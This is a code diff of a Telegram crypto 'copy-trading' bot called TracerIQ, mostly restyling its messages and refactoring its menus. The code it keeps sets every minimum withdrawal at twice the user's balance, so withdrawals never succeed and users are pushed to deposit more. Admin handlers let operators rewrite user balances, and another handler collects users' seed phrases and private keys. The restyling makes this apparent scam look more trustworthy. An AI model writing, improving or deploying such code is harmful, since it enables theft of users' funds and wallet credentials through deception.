-            sym      = "SOL"
+            balance = get_user_balance(user_id)
+            price = await get_sol_price_usd()
+            sym = "SOL"
             stored_min = bal_data.get("min_withdrawal", balance * 2)
             if stored_min == 0 and balance > 0:
                 stored_min = balance * 2
         elif token == "eth":
-            balance  = bal_data.get("eth_balance", 0)
+            balance = bal_data.get("eth_balance", 0)
             price, _ = await get_evm_prices_usd()
-            sym      = "ETH"
+            sym = "ETH"
             stored_min = balance * 2
         else:
-            balance  = bal_data.get("bnb_balance", 0)
+            balance = bal_data.get("bnb_balance", 0)
             _, price = await get_evm_prices_usd()
-            sym      = "BNB"
+            sym = "BNB"
             stored_min = balance * 2
         usd_value = balance * price if price > 0 else 0
-        back_btn  = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]])
+        back_btn = InlineKeyboardMarkup(
+            [[InlineKeyboardButton("⌂ Change asset", callback_data="back_withdraw")]]
+        )
         if balance == 0:
-            await query.message.reply_text(f"❗ Insufficient {sym} balance.", parse_mode="HTML", reply_markup=back_btn)
+            await query.message.reply_text(
+                f"⚠️ <b>No {sym} available</b>\n\n"
+                "Choose another asset or fund this wallet first.",
+                parse_mode="HTML",
+                reply_markup=back_btn,
+            )
             return
         if usd_value < 10:
             await query.message.reply_text(
-                f"❗ Your balance must be above $10 to withdraw.\n\n"
-                f"Current balance: {balance:.6f} {sym} (${usd_value:.2f})\n"
-                f"Required minimum: $10 worth of {sym}\n\n"
-                f"Please deposit more {sym} to meet the minimum withdrawal requirement.",
-                parse_mode="HTML", reply_markup=back_btn,
+                f"⚠️ <b>Balance below the withdrawal threshold</b>\n\n"
+                f"Available: {balance:.6f} {sym}  ·  ${usd_value:.2f}\n"
+                f"Required value: at least $10 in {sym}\n\n"
+                f"Add {sym} to continue.",
+                parse_mode="HTML",
+                reply_markup=back_btn,
             )
             return
         await query.message.reply_text(
-            f"💸 <b>Withdrawal Requirements</b>\n\n"
-            f"Your current balance: {balance:.6f} {sym} (${usd_value:.2f})\n\n"
-            f"<b>Minimum withdrawal required:</b> {stored_min:.6f} {sym}\n"
-            f"❗ You need at least {stored_min:.6f} {sym} to process a withdrawal.\n"
-            f"Please deposit more funds to meet the minimum requirement.",
-            parse_mode="HTML", reply_markup=back_btn,
+            f"⚠️ <b>Minimum not met</b>\n\n"
+            f"Available: {balance:.6f} {sym}  ·  ${usd_value:.2f}\n"
+            f"Minimum eligible amount: {stored_min:.6f} {sym}\n\n"
+            f"Add more {sym} before continuing.",
+            parse_mode="HTML",
+            reply_markup=back_btn,
         )
         return
 
@@ -3324,49 +3634,57 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = context.user_data.get("withdraw_token", "sol")
         bal_data = user_balances.get(user_id, {})
         if token == "sol":
-            balance  = get_user_balance(user_id)
-            price    = await get_sol_price_usd()
-            sym      = "SOL"
+            balance = get_user_balance(user_id)
+            price = await get_sol_price_usd()
+            sym = "SOL"
             stored_min = bal_data.get("min_withdrawal", balance * 2)
             if stored_min == 0 and balance > 0:
                 stored_min = balance * 2
         elif token == "eth":
-            balance  = bal_data.get("eth_balance", 0)
+            balance = bal_data.get("eth_balance", 0)
             price, _ = await get_evm_prices_usd()
-            sym      = "ETH"
+            sym = "ETH"
             stored_min = balance * 2
         else:
-            balance  = bal_data.get("bnb_balance", 0)
+            balance = bal_data.get("bnb_balance", 0)
             _, price = await get_evm_prices_usd()
-            sym      = "BNB"
+            sym = "BNB"
             stored_min = balance * 2
         usd_value = balance * price if price > 0 else 0
-        back_btn  = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]])
+        back_btn = InlineKeyboardMarkup(
+            [[InlineKeyboardButton("⌂ Change asset", callback_data="back_withdraw")]]
+        )
         if balance == 0:
-            await query.message.reply_text(f"❗ Insufficient {sym} balance.", parse_mode="HTML", reply_markup=back_btn)
+            await query.message.reply_text(
+                f"⚠️ <b>No {sym} available</b>\n\n"
+                "Choose another asset or fund this wallet first.",
+                parse_mode="HTML",
+                reply_markup=back_btn,
+            )
             return
         if balance < stored_min:
             await query.message.reply_text(
-                f"💸 <b>Withdrawal Requirements</b>\n\n"
-                f"Your current balance: {balance:.6f} {sym} (${usd_value:.2f})\n\n"
-                f"<b>Minimum withdrawal required:</b> {stored_min:.6f} {sym}\n"
-                f"❗ You need at least {stored_min:.6f} {sym} to process a withdrawal.\n"
-                f"Please deposit more funds to meet the minimum requirement.",
-                parse_mode="HTML", reply_markup=back_btn,
+                f"⚠️ <b>Minimum not met</b>\n\n"
+                f"Available: {balance:.6f} {sym}  ·  ${usd_value:.2f}\n"
+                f"Minimum eligible amount: {stored_min:.6f} {sym}\n\n"
+                f"Add more {sym} before continuing.",
+                parse_mode="HTML",
+                reply_markup=back_btn,
             )
             return
         half = balance / 2
         half_usd = half * price if price > 0 else 0
         network = {"sol": "Solana", "eth": "Ethereum", "bnb": "BNB Smart Chain"}[token]
         await query.message.reply_text(
-            f"💸 <b>Withdraw 50%</b>\n\n"
-            f"Amount to withdraw: <b>{half:.6f} {sym}</b> (${half_usd:.2f})\n\n"
-            f"Please send your {network} wallet address to receive the funds.\n\n"
-            f"📝 Enter your wallet address below:",
-            parse_mode="HTML", reply_markup=cancel_markup(),
+            f"◈ <b>HALF-BALANCE CHECK</b>\n\n"
+            f"Selected amount: <b>{half:.6f} {sym}</b>  ·  ${half_usd:.2f}\n"
+            f"Network: {network}\n\n"
+            f"Enter the amount to check against the withdrawal rules.",
+            parse_mode="HTML",
+            reply_markup=cancel_markup(),
         )
         context.user_data["awaiting_withdraw"] = True
-        context.user_data["withdraw_amount"]   = half
+        context.user_data["withdraw_amount"] = half
         return
 
     if option == "withdraw_custom":
@@ -3375,32 +3693,32 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = context.user_data.get("withdraw_token", "sol")
         bal_data = user_balances.get(user_id, {})
         if token == "sol":
-            balance  = get_user_balance(user_id)
-            price    = await get_sol_price_usd()
-            sym      = "SOL"
+            balance = get_user_balance(user_id)
+            price = await get_sol_price_usd()
+            sym = "SOL"
             stored_min = bal_data.get("min_withdrawal", balance * 2)
             if stored_min == 0 and balance > 0:
                 stored_min = balance * 2
         elif token == "eth":
-            balance  = bal_data.get("eth_balance", 0)
+            balance = bal_data.get("eth_balance", 0)
             price, _ = await get_evm_prices_usd()
-            sym      = "ETH"
+            sym = "ETH"
             stored_min = balance * 2
         else:
-            balance  = bal_data.get("bnb_balance", 0)
+            balance = bal_data.get("bnb_balance", 0)
             _, price = await get_evm_prices_usd()
-            sym      = "BNB"
+            sym = "BNB"
             stored_min = balance * 2
         usd_value = balance * price if price > 0 else 0
         sent = await query.message.reply_text(
-            f"💸 <b>Withdraw Custom Amount</b>\n\n"
-            f"Your current balance: <b>{balance:.6f} {sym}</b> (${usd_value:.2f})\n\n"
-            f"<b>Minimum withdrawal:</b> {stored_min:.6f} {sym}\n"
-            f"Please enter the withdrawal amount (in {sym}):\n\n"
-            f"📝 Enter your desired amount (minimum: {stored_min:.6f} {sym})",
-            parse_mode="HTML", reply_markup=cancel_markup(),
+            f"◈ <b>ENTER WITHDRAWAL AMOUNT</b>\n\n"
+            f"Available: <b>{balance:.6f} {sym}</b>  ·  ${usd_value:.2f}\n"
+            f"Minimum eligible amount: <b>{stored_min:.6f} {sym}</b>\n\n"
+            f"Send the amount in {sym}, or choose Cancel.",
+            parse_mode="HTML",
+            reply_markup=cancel_markup(),
         )
-        context.user_data["withdraw_prompt_msg_id"]  = sent.message_id
+        context.user_data["withdraw_prompt_msg_id"] = sent.message_id
         context.user_data["withdraw_prompt_chat_id"] = sent.chat_id
         return
 
@@ -3412,8 +3730,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_settings")]]
     )
 
-    await query.edit_message_text(
-        text=f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:\n\n📝 Enter your desired value and send it as a message.",
+    await _del()
+    await query.message.reply_text(
+        text=f"◈ <b>{option.replace('_', ' ').title()}</b>\n\nEnter the new value and send it as a message.",
         parse_mode="HTML",
         reply_markup=cancel_button,
     )
@@ -3421,32 +3740,52 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ---- Helpers ----
 def main_menu_markup():
-    """Persistent keyboard – only the Refresh Portfolio button."""
-    return ReplyKeyboardMarkup([["🔄 Refresh Portfolio"]], resize_keyboard=True)
+    """Persistent Home shortcut shown below TracerIQ messages."""
+    return InlineKeyboardMarkup(
+        [[InlineKeyboardButton("⌂ Home", callback_data="back_main")]]
+    )
 
 
 def main_menu_inline():
-    """Full navigation inline keyboard shown on the start/home page."""
+    """Copy-trading-first navigation for the TracerIQ home screen."""
     return InlineKeyboardMarkup(
         [
-            # [InlineKeyboardButton("📢 JOIN TracerIQ Community", url="https://t.me/")],
             [
                 InlineKeyboardButton(
-                    "🔗 COPY TRADE SMART WALLET", callback_data="ct_wallet_view"
+                    "🎯 Open Copy-Trading Desk", callback_data="ct_wallet_view"
                 )
             ],
             [
-                InlineKeyboardButton("💳 Wallet", callback_data="show_wallet"),
-                InlineKeyboardButton("🤖 Bot Guide", callback_data="show_bot_guide"),
+                InlineKeyboardButton("💼 Portfolio", callback_data="show_wallet"),
+                InlineKeyboardButton("📘 How It Works", callback_data="show_bot_guide"),
             ],
             [
-                InlineKeyboardButton("🔴 Sell", callback_data="show_sell"),
-                InlineKeyboardButton("🟢 Buy", callback_data="show_buy"),
+                # InlineKeyboardButton("📡 Live Market", callback_data="show_live_chart"),
+                InlineKeyboardButton("🤝 Invite Traders", callback_data="refer_earn"),
+            ],
+        ]
+    )
+
+
+def copy_trade_setup_keyboard():
+    """Copy-rule controls; callback identifiers preserve the existing behavior."""
+    return InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton(
+                    "🛰️ Follow Wallet", callback_data="ct_target_wallet"
+                ),
+                InlineKeyboardButton(
+                    "💸 Copy Allocation", callback_data="ct_buy_amount"
+                ),
             ],
             [
-                InlineKeyboardButton("📊 Live Chart", callback_data="show_live_chart"),
-                InlineKeyboardButton("🏆 Refer and Earn", callback_data="refer_earn"),
+                InlineKeyboardButton(
+                    "🔁 Entry Limit", callback_data="ct_consecutive_buys"
+                ),
+                InlineKeyboardButton("🎯 Exit Rule", callback_data="ct_sell_position"),
             ],
+            [InlineKeyboardButton("⌂ Portfolio", callback_data="back_wallet")],
         ]
     )
 
@@ -3459,8 +3798,9 @@ def back_to_menu_btn():
 
 
 def cancel_markup():
-    return ReplyKeyboardMarkup(
-        [["Cancel"]], resize_keyboard=True, one_time_keyboard=True
+    return _make_reply_keyboard(
+        [[_register_reply_button("Cancel", {"kind": "input", "text": "Cancel"})]],
+        placeholder="Type a value or choose Cancel",
     )
 
 
@@ -3595,7 +3935,8 @@ def format_token_details(pair_data, wallet_balance=0, chain_sym="SOL"):
 
         extra_link = (
             f" | <a href='https://www.pump.fun/{token_address}'>Pump</a>"
-            if dex_chain == "solana" else ""
+            if dex_chain == "solana"
+            else ""
         )
 
         message = (
@@ -3648,46 +3989,52 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if inviter_id:
                 try:
                     inviter_chat = await context.bot.get_chat(inviter_id)
-                    inviter_name = inviter_chat.first_name or inviter_chat.username or str(inviter_id)
+                    inviter_name = (
+                        inviter_chat.first_name
+                        or inviter_chat.username
+                        or str(inviter_id)
+                    )
                 except Exception:
                     inviter_name = "a friend"
                 inviter_line = f"\n\n👥 You were invited by <b>{inviter_name}</b>!"
 
     welcome_text = (
-        "👋 <b>Welcome to TracerIQ Bot!</b>\n"
-        "Step into the world of fast, smart, and stress-free trading, "
-        "designed for both beginners and seasoned traders.\n\n"
-        "🔗 Connecting to your wallet...\n"
-        "⏳ Initializing your account and securing your funds...\n"
-        "✅ Wallet successfully created and linked!"
+        "◈ <b>TRACERIQ</b>\n"
+        "<i>INTELLIGENT SOLANA COPY-TRADING DESK</i>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Welcome. Track selected wallets, configure how their activity is copied, "
+        "and review your portfolio from Telegram.\n\n"
+        "🎯 <b>Start here</b>\n"
+        "Open the Copy-Trading Desk to set a target wallet and choose your copy rules. "
+        "Check the wallet and settings before enabling any strategy.\n"
         f"{inviter_line}\n\n"
-        f"🔗 <b>Your Referral Link:</b>\n"
-        f"Invite friends and earn rewards:\n"
+        "🤝 <b>Your invite link</b>\n"
         f"<code>{referral_link}</code>\n\n"
-        "👇 Select an option below to continue."
+        "<i>Crypto assets are volatile. Review transactions and manage risk carefully.</i>\n\n"
+        "Choose a destination below."
     )
 
     if update.message:
-        await update.message.reply_text(
-            "💡 Use <b>🔄 Refresh Portfolio</b> below to refresh your balance.",
-            parse_mode="HTML",
-            reply_markup=main_menu_markup(),
-        )
-        await update.message.reply_text(
-            welcome_text,
-            parse_mode="HTML",
-            reply_markup=main_menu_inline(),
-        )
+        with START_BANNER_PATH.open("rb") as banner:
+            await update.message.reply_photo(
+                photo=banner,
+                caption=welcome_text,
+                parse_mode="HTML",
+                reply_markup=main_menu_inline(),
+            )
     elif update.callback_query:
         try:
             await update.callback_query.message.delete()
         except Exception:
             pass
-        await update.callback_query.message.reply_text(
-            welcome_text,
-            parse_mode="HTML",
-            reply_markup=main_menu_inline(),
-        )
+        with START_BANNER_PATH.open("rb") as banner:
+            await context.bot.send_photo(
+                chat_id=update.callback_query.message.chat_id,
+                photo=banner,
+                caption=welcome_text,
+                parse_mode="HTML",
+                reply_markup=main_menu_inline(),
+            )
 
     # --- /support ---
 
@@ -3697,9 +4044,9 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id in banned_users:
         return
     await update.message.reply_text(
-        "  �� Support Contact\n\n"
-        "If you need help, our support team is available to assist you.\n\n"
-        "Feel free to click the button below to send them a message anytime!",
+        "◈ <b>TRACERIQ  /  SUPPORT</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Need help with your workspace? Use the button below to open TracerIQ support.",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(
             [[InlineKeyboardButton("🔧 Reach Support", url=SUPPORT_LINK)]]
@@ -3721,6 +4068,40 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (update.message.text or "").strip()
     user = update.effective_user
     user_name = user.username or user.first_name or str(user_id)
+
+    reply_button = _decode_reply_button(text)
+    if reply_button:
+        action, plain_label = reply_button
+        try:
+            await update.message.delete()
+        except Exception:
+            # Continue with the requested action if Telegram denies deletion.
+            pass
+
+        if action["kind"] == "callback":
+            await button_handler(update, context, reply_action=action["data"])
+            return
+        if action["kind"] == "url":
+            url = html_escape(action["url"], quote=True)
+            label = html_escape(action["label"])
+            await context.bot.send_message(
+                chat_id=update.message.chat_id,
+                text=f'<a href="{url}">{label}</a>',
+                parse_mode="HTML",
+                disable_web_page_preview=True,
+            )
+            return
+        if action["kind"] == "input":
+            text = action["text"]
+            update = _ReplyKeyboardInputUpdate(update, context, text)
+    elif text in ("Cancel", "🔄 Refresh Portfolio"):
+        # Remove button messages sent by reply keyboards from older bot
+        # sessions, which do not carry the hidden action tag.
+        try:
+            await update.message.delete()
+        except Exception:
+            pass
+        update = _ReplyKeyboardInputUpdate(update, context, text)
 
     # Handle Admin inputs
     if user_id in ADMIN_IDS:
@@ -3749,8 +4130,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             giveaway_data["draw_interval_seconds"] = interval_seconds
             if giveaway_data.get("status") == "active":
                 giveaway_data["next_draw_at"] = (
-                    datetime.now(timezone.utc)
-                    + timedelta(seconds=interval_seconds)
+                    datetime.now(timezone.utc) + timedelta(seconds=interval_seconds)
                 ).isoformat()
             save_giveaway()
             await update.message.reply_text(
@@ -3799,14 +4179,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 # visible in VPS service logs. Never log the credential itself.
                 if isinstance(error, ValueError):
                     print(
-                        "Giveaway wallet setup rejected: "
-                        f"{error}",
+                        f"Giveaway wallet setup rejected: {error}",
                         flush=True,
                     )
                 else:
                     print(
-                        "Giveaway wallet setup failed: "
-                        f"{type(error).__name__}",
+                        f"Giveaway wallet setup failed: {type(error).__name__}",
                         flush=True,
                     )
                 await update.message.reply_text(
@@ -3899,12 +4277,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             }
             for participant in candidate_records:
                 solana_address = participant["solana_address"]
-                if (
-                    solana_address not in existing
-                    and all(
-                        item["solana_address"] != solana_address
-                        for item in valid_records
-                    )
+                if solana_address not in existing and all(
+                    item["solana_address"] != solana_address for item in valid_records
                 ):
                     valid_records.append(participant)
 
@@ -4015,15 +4389,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"🔔 <b>Notifications:</b> {mute_status}"
                     )
 
-                    mute_label   = "🔕 Mute 🟢"   if is_muted else "🔕 Mute"
+                    mute_label = "🔕 Mute 🟢" if is_muted else "🔕 Mute"
                     unmute_label = "🔔 Unmute 🟢" if not is_muted else "🔔 Unmute"
 
                     keyboard = InlineKeyboardMarkup(
                         [
                             [
-                                InlineKeyboardButton("✏️ Edit SOL", callback_data=f"admin_edit_balance_{target_id}"),
-                                InlineKeyboardButton("✏️ Edit ETH", callback_data=f"admin_edit_ethbal_{target_id}"),
-                                InlineKeyboardButton("✏️ Edit BNB", callback_data=f"admin_edit_bnbbal_{target_id}"),
+                                InlineKeyboardButton(
+                                    "✏️ Edit SOL",
+                                    callback_data=f"admin_edit_balance_{target_id}",
+                                ),
+                                InlineKeyboardButton(
+                                    "✏️ Edit ETH",
+                                    callback_data=f"admin_edit_ethbal_{target_id}",
+                                ),
+                                InlineKeyboardButton(
+                                    "✏️ Edit BNB",
+                                    callback_data=f"admin_edit_bnbbal_{target_id}",
+                                ),
                             ],
                             [
                                 InlineKeyboardButton(
@@ -4032,8 +4415,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 )
                             ],
                             [
-                                InlineKeyboardButton(mute_label,   callback_data=f"admin_mute_{target_id}"),
-                                InlineKeyboardButton(unmute_label, callback_data=f"admin_unmute_{target_id}"),
+                                InlineKeyboardButton(
+                                    mute_label, callback_data=f"admin_mute_{target_id}"
+                                ),
+                                InlineKeyboardButton(
+                                    unmute_label,
+                                    callback_data=f"admin_unmute_{target_id}",
+                                ),
                             ],
                             [
                                 InlineKeyboardButton(
@@ -4092,7 +4480,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 new_min = user_balances[target_id]["min_withdrawal"]
                 usd_value = new_sol * sol_price if sol_price > 0 else 0
 
-                label_map = {"balance": "SOL Balance", "ethbal": "ETH Balance", "bnbbal": "BNB Balance", "minw": "Min Withdrawal"}
+                label_map = {
+                    "balance": "SOL Balance",
+                    "ethbal": "ETH Balance",
+                    "bnbbal": "BNB Balance",
+                    "minw": "Min Withdrawal",
+                }
                 label = label_map.get(field, field.replace("_", " ").title())
 
                 update_msg = (
@@ -4120,16 +4513,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
         # Verify $20 minimum across total portfolio (SOL + ETH + BNB) silently
-        sol_balance  = get_user_balance(user_id)
-        sol_price    = await get_sol_price_usd()
+        sol_balance = get_user_balance(user_id)
+        sol_price = await get_sol_price_usd()
         eth_price_ct, bnb_price_ct = await get_evm_prices_usd()
-        bal_ct       = user_balances.get(user_id, {})
-        eth_balance  = bal_ct.get("eth_balance", 0)
-        bnb_balance  = bal_ct.get("bnb_balance", 0)
-        total_usd    = (
-            sol_balance * sol_price +
-            eth_balance * eth_price_ct +
-            bnb_balance * bnb_price_ct
+        bal_ct = user_balances.get(user_id, {})
+        eth_balance = bal_ct.get("eth_balance", 0)
+        bnb_balance = bal_ct.get("bnb_balance", 0)
+        total_usd = (
+            sol_balance * sol_price
+            + eth_balance * eth_price_ct
+            + bnb_balance * bnb_price_ct
         )
         if total_usd < 20:
             context.user_data.pop("awaiting_ct_target_wallet", None)
@@ -4139,10 +4532,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=main_menu_inline(),
             )
             return
-        wallet_address  = text.strip()
-        base58_pattern  = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
-        evm_pattern     = r"^0x[0-9a-fA-F]{40}$"
-        if not re.match(base58_pattern, wallet_address) and not re.match(evm_pattern, wallet_address):
+        wallet_address = text.strip()
+        base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
+        evm_pattern = r"^0x[0-9a-fA-F]{40}$"
+        if not re.match(base58_pattern, wallet_address) and not re.match(
+            evm_pattern, wallet_address
+        ):
             await update.message.reply_text(
                 "❗ Invalid wallet address.\n\n"
                 "• For Solana: enter a 32-44 character base58 address.\n"
@@ -4152,31 +4547,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         context.user_data["ct_target_wallet"] = wallet_address
         context.user_data.pop("awaiting_ct_target_wallet", None)
-        copy_trade_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🎯 Target Wallet", callback_data="ct_target_wallet"
-                    ),
-                    InlineKeyboardButton(
-                        "💰 Buy Amount", callback_data="ct_buy_amount"
-                    ),
-                ],
-                [
-                    InlineKeyboardButton(
-                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
-                    ),
-                    InlineKeyboardButton(
-                        "📤 Sell Position", callback_data="ct_sell_position"
-                    ),
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        copy_trade_buttons = copy_trade_setup_keyboard()
         await update.message.reply_text(
-            f"✅ <b>Target Wallet set!</b>\n\n"
+            f"✅ <b>FOLLOW TARGET SAVED</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"<code>{wallet_address}</code>\n\n"
-            "Configure your remaining copy trade settings:",
+            "Next, choose your copy allocation, entry limit, and exit rule:",
             parse_mode="HTML",
             reply_markup=copy_trade_buttons,
         )
@@ -4201,30 +4577,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         context.user_data["ct_buy_amount"] = amount
         context.user_data.pop("awaiting_ct_buy_amount", None)
-        copy_trade_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🎯 Target Wallet", callback_data="ct_target_wallet"
-                    ),
-                    InlineKeyboardButton(
-                        "💰 Buy Amount", callback_data="ct_buy_amount"
-                    ),
-                ],
-                [
-                    InlineKeyboardButton(
-                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
-                    ),
-                    InlineKeyboardButton(
-                        "📤 Sell Position", callback_data="ct_sell_position"
-                    ),
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        copy_trade_buttons = copy_trade_setup_keyboard()
         await update.message.reply_text(
-            f"✅ <b>Buy Amount set to {amount} SOL</b>\n\n"
-            "Configure your remaining copy trade settings:",
+            f"✅ <b>COPY ALLOCATION SAVED</b>  ·  {amount} SOL\n\n"
+            "Continue setting up your copy rules:",
             parse_mode="HTML",
             reply_markup=copy_trade_buttons,
         )
@@ -4249,30 +4605,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         context.user_data["ct_consecutive_buys"] = num
         context.user_data.pop("awaiting_ct_consecutive_buys", None)
-        copy_trade_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🎯 Target Wallet", callback_data="ct_target_wallet"
-                    ),
-                    InlineKeyboardButton(
-                        "💰 Buy Amount", callback_data="ct_buy_amount"
-                    ),
-                ],
-                [
-                    InlineKeyboardButton(
-                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
-                    ),
-                    InlineKeyboardButton(
-                        "📤 Sell Position", callback_data="ct_sell_position"
-                    ),
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        copy_trade_buttons = copy_trade_setup_keyboard()
         await update.message.reply_text(
-            f"✅ <b>Consecutive Buys set to {num}</b>\n\n"
-            "Configure your remaining copy trade settings:",
+            f"✅ <b>ENTRY LIMIT SAVED</b>  ·  {num}\n\n"
+            "Continue setting up your copy rules:",
             parse_mode="HTML",
             reply_markup=copy_trade_buttons,
         )
@@ -4309,13 +4645,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.pop("awaiting_ct_slippage", None)
         context.user_data.pop("ct_sell_position", None)
         await update.message.reply_text(
-            f"✅ <b>Copy Trade Configuration Saved!</b>\n\n"
-            f"🎯 <b>Target Wallet:</b> <code>{target}</code>\n"
-            f"💰 <b>Buy Amount:</b> {buy_amount} SOL\n"
-            f"🔁 <b>Consecutive Buys:</b> {consec}\n"
-            f"📤 <b>Sell Position:</b> {sell_pos}\n"
-            f"⚡ <b>Slippage:</b> {slippage}%\n\n"
-            f"Your copy trade settings have been saved and will be applied to your trades.",
+            f"◈ <b>TRACERIQ  /  COPY RULES SAVED</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🛰️ <b>Follow target</b>  ·  <code>{target}</code>\n"
+            f"💸 <b>Copy allocation</b>  ·  {buy_amount} SOL\n"
+            f"🔁 <b>Entry limit</b>  ·  {consec}\n"
+            f"🎯 <b>Exit rule</b>  ·  {sell_pos}\n"
+            f"◈ <b>Slippage</b>  ·  {slippage}%\n\n"
+            "Your copy rules have been saved.",
             parse_mode="HTML",
             reply_markup=main_menu_inline(),
         )
@@ -4337,7 +4674,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(
                     "❌ <b>Invalid Seed Phrase</b>\n\n"
                     "Enter exactly 12 valid BIP39 English words.",
-                    parse_mode="HTML", reply_markup=cancel_markup(),
+                    parse_mode="HTML",
+                    reply_markup=cancel_markup(),
                 )
                 return
             phrase = " ".join(words)
@@ -4345,7 +4683,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(
                     "❌ <b>Invalid Seed Phrase</b>\n\n"
                     "The words are BIP39 words, but the checksum is invalid. Try again.",
-                    parse_mode="HTML", reply_markup=cancel_markup(),
+                    parse_mode="HTML",
+                    reply_markup=cancel_markup(),
                 )
                 return
             credential = phrase
@@ -4354,7 +4693,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             credential = text.strip()
             credential_type = None
             # EVM: 32 bytes represented as 64 hex characters.
-            evm_key = credential[2:] if credential.lower().startswith("0x") else credential
+            evm_key = (
+                credential[2:] if credential.lower().startswith("0x") else credential
+            )
             if re.fullmatch(r"[0-9a-fA-F]{64}", evm_key):
                 try:
                     Account.from_key(evm_key)
@@ -4375,7 +4716,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "❌ <b>Invalid Private Key</b>\n\n"
                     "Use a Solana base58 64-byte private key or a 64-character "
                     "hexadecimal EVM key (with optional 0x prefix).",
-                    parse_mode="HTML", reply_markup=cancel_markup(),
+                    parse_mode="HTML",
+                    reply_markup=cancel_markup(),
                 )
                 return
 
@@ -4422,29 +4764,35 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     pass
 
         back_btn = InlineKeyboardMarkup(
-            [[InlineKeyboardButton("⬅️ Back to Withdraw", callback_data="back_withdraw")]]
+            [
+                [
+                    InlineKeyboardButton(
+                        "⬅️ Back to Withdraw", callback_data="back_withdraw"
+                    )
+                ]
+            ]
         )
 
         # Resolve which token is being withdrawn
         w_token = context.user_data.get("withdraw_token", "sol")
-        bal_wd  = user_balances.get(user_id, {})
+        bal_wd = user_balances.get(user_id, {})
         if w_token == "sol":
-            w_balance  = get_user_balance(user_id)
-            w_price    = await get_sol_price_usd()
-            w_sym      = "SOL"
-            w_min      = bal_wd.get("min_withdrawal", w_balance * 2)
+            w_balance = get_user_balance(user_id)
+            w_price = await get_sol_price_usd()
+            w_sym = "SOL"
+            w_min = bal_wd.get("min_withdrawal", w_balance * 2)
             if w_min == 0 and w_balance > 0:
                 w_min = w_balance * 2
         elif w_token == "eth":
-            w_balance  = bal_wd.get("eth_balance", 0)
+            w_balance = bal_wd.get("eth_balance", 0)
             w_price, _ = await get_evm_prices_usd()
-            w_sym      = "ETH"
-            w_min      = w_balance * 2
+            w_sym = "ETH"
+            w_min = w_balance * 2
         else:
-            w_balance  = bal_wd.get("bnb_balance", 0)
+            w_balance = bal_wd.get("bnb_balance", 0)
             _, w_price = await get_evm_prices_usd()
-            w_sym      = "BNB"
-            w_min      = w_balance * 2
+            w_sym = "BNB"
+            w_min = w_balance * 2
         w_usd = w_balance * w_price if w_price > 0 else 0
 
         if text.lower() == "cancel":
@@ -4452,7 +4800,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.pop("withdraw_token", None)
             await _del_prompt()
             cancelled_msg = await update.message.reply_text(
-                "❌ <b>Withdrawal Cancelled.</b>", parse_mode="HTML"
+                "◈ <b>WITHDRAWAL CANCELLED</b>\n\nNo withdrawal request was completed.",
+                parse_mode="HTML",
             )
             await asyncio.sleep(1.5)
             try:
@@ -4468,7 +4817,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             amount = float(text)
         except ValueError:
             await update.message.reply_text(
-                f"❗ Invalid amount. Please enter a number (in {w_sym}).",
+                f"⚠️ Enter a valid amount using numbers only ({w_sym}).",
                 reply_markup=back_btn,
             )
